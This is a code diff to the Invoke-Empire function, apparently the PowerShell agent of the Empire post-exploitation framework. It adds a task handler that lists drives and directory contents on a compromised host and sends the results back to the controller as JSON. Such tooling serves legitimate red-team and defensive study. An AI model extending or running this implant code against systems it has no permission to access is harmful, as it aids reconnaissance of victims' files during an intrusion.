@@ -893,6 +893,36 @@ function Invoke-Empire {
                     Encode-Packet -type 0 -data '[!] Error in writing file during upload' -ResultID $ResultID
                 }
             }
+            # directory list
+            elseif($type -eq 43) {
+                $output = ""
+                $path = "/"
+                if ($data.length -gt 1) { # Use user supplied directory
+                    $path = $data
+                }
+                if ($path -eq "/") { # if the path is root, list drives as directories
+                    $array = @()
+                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
+                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false})
+                    }
+                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress
+                } elseif (-Not (Test-Path $path -PathType Container)) { # if path doesn't exist
+                    $output = "Directory " + $path + " not found."
+                } else {
+                # Normal conditions
+                    $array = @()
+                    Get-ChildItem -force -Path $path -Attributes !directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $true }) }
+                    Get-ChildItem -force -Path $path -Attributes directory | foreach-object { $array += (@{ path = $_.FullName; name = $_.Name; is_file = $false }) }
+                    $directory = Get-Item -force -Path $path # this way we always get the backslashes even if user supplied forward slashes
+                    $output = @{ directory_name = $directory.Name; directory_path = $directory.FullName; items = $array } | ConvertTo-Json -Compress
+
+                    if ($directory -eq $null)
+                    {
+                        $output = "User does not have access to directory " + $path
+                    }
+                }
+                Encode-Packet -data $output -type $type -ResultID $ResultID
+            }
 
             # return the currently running jobs
             elseif($type -eq 50) {
